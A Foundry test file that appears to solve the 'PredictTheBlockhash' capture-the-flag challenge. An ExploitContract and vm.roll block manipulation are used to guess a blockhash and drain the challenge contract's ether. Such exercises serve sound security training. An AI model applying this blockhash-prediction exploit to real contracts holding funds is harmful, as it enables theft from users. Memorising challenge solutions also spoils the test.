// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        bytes32 hashToSet;
        console.log(address(predictTheBlockhash).balance);

        vm.roll(blockNumber + 1);
        hashToSet = blockhash(block.number - 1);
        exploitContract.setHash(hashToSet);
        vm.roll(blockNumber - 1);
        exploitContract.lockIn{value: 1 ether}();
        vm.roll(blockNumber + 2);
        exploitContract.settle();
        console.log(address(predictTheBlockhash).balance);

        // Put your solution here

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
